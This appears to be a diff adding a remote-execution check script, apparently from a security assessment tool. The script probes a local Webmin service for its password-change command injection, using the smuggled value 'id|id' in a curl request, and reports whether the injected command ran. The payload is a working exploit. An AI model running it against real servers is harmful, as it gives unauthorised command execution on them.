@@ -1,0 +1,26 @@
+execute: remote
+script: |
+  #!/bin/bash
+
+  function getParam() {
+   if [ "$1" != "null" ]; then
+       echo $1 | cut -d\" -f 2
+   else
+       echo ""
+   fi
+  }
+
+  export http_proxy=""
+  export https_proxy=""
+
+  principal=$(getParam $1)
+  host=$(getParam $2)
+  username=$(getParam $3)
+
+  u=`curl -ks https://127.0.0.1:10000/password_change.cgi -d 'user=wheel&pam=&expired=2&old=id|id&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: https://127.0.0.1:10000/session_login.cgi' | grep "The current password is incorrect" | cut -c74-`
+  c=`id $username`
+  if [ "$u" != "$c" ]; then
+     username=""
+  fi
+
+  echo -n "{\"principal\":\"$principal\", \"username\":\"$username\", \"host\":\"$host\""}
